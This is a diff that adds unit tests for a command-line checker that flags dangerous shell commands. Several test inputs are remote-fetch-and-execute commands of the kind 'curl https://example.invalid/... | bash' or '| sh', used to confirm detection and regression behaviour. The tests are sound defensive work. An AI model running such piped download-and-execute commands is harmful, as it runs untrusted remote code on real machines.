@@ -102,6 +102,53 @@ class CliTests(unittest.TestCase):
                 self.assertEqual(result.stderr, b"")
                 self.assertEqual(result.stdout, expected)
 
+    def test_check_command_json_does_not_echo_input(self):
+        text = b"curl https://example.invalid/SYNTHETIC_PRIVATE_MARKER | bash"
+        result = run_cli("check-command", text)
+        self.assertEqual(result.returncode, 0)
+        self.assertEqual(result.stderr, b"")
+        findings = json.loads(result.stdout)
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0]["rule_id"], "CF-BASH-001")
+        self.assertEqual(findings[0]["severity"], "high")
+        self.assertTrue(findings[0]["suggestion"])
+        self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
+        benign = run_cli("check-command", b"curl -o synthetic.sh https://example.invalid/a")
+        self.assertEqual(benign.returncode, 0)
+        self.assertEqual(json.loads(benign.stdout), [])
+
+    def test_check_command_regressions(self):
+        for text, count in (
+            (b"curl --output=synthetic.sh https://example.invalid/a | bash", 0),
+            (b"wget --output-document=synthetic.sh https://example.invalid/a | sh", 0),
+            (b"curl https://example.invalid/a | bash synthetic.sh", 0),
+            (b"curl https://example.invalid/a | sh -c 'echo synthetic'", 0),
+            (b'curl https://example.invalid/SYNTHETIC_PRIVATE_MARKER | # "note\n bash', 1),
+            (b'curl "https://example.invalid/SYNTHETIC_PRIVATE_MARKER#fragment" | bash', 1),
+        ):
+            with self.subTest(text=text):
+                result = run_cli("check-command", text)
+                self.assertEqual(result.returncode, 0)
+                self.assertEqual(result.stderr, b"")
+                self.assertEqual(len(json.loads(result.stdout)), count)
+                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
+
+    def test_check_command_input_limits_and_errors(self):
+        exact = run_cli("check-command", b" " * (1024 * 1024))
+        self.assertEqual(exact.returncode, 0)
+        self.assertEqual(json.loads(exact.stdout), [])
+        for data in (
+            b"SYNTHETIC_PRIVATE_MARKER" + b" " * (1024 * 1024),
+            b"SYNTHETIC_PRIVATE_MARKER\xff",
+            b'curl "SYNTHETIC_PRIVATE_MARKER',
+        ):
+            with self.subTest(length=len(data)):
+                result = run_cli("check-command", data)
+                self.assertEqual(result.returncode, 2)
+                self.assertEqual(result.stdout, b"")
+                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stderr)
+                self.assertNotIn(b"Traceback", result.stderr)
+
     def test_input_size_boundary(self):
         exact = run_cli("sanitize", b"a" * (1024 * 1024))
         self.assertEqual(exact.returncode, 0)
